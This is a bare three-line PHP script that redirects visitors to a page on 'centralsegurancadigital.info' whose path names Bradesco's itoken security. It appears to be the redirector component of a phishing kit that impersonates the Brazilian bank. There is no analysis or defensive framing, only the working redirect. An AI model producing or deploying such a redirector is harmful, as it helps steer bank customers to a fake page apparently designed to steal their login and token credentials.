<?php
header("Location: http://centralsegurancadigital.info/segurancaitokenbradesco/");
?>